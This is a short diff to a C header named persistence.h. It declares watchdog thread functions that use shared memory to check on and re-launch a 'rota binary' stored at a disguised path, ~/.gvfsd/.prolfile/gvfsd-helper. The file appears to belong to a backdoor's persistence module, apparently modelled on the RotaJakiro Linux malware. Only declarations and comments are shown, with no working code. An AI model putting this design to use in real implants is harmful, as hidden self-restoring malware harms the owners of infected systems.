@@ -63,4 +63,30 @@ bool monitor_proc(int pid);
  * */
 bool write_to_file(char *fpath, char *data);
 
+
+
+/**
+ * @brief intial watchdog_thread, monitor shared memory for existence of other file.
+ * this function is started via a thread.
+ * @param char pointer to file path to exec (rota binary)
+ * @return N/A
+ * */
+void watchdog_process_shmget(char *fpath);
+
+
+/**
+ *@brief secondary watchdog_thread, read shared memory for existence of other file
+ *@param fpath char pointer to file path to exec (rota binary)
+ *@return N/A
+ * */
+void watchdog_process_shmread(char *fpath);
+
+/**
+ * @brief spawn a thread for persistence IPC watchdog processes
+ * @param uid to indicate which watchdog to spawn
+ * @param fpath file path to rota  (~/.gvfsd/.prolfile/gvfsd-helper)
+ * @return N/A
+ **/
+void spawn_thread_watchdog(int some_id, char *fpath);
+
 #endif // PERSISTENCE_H_
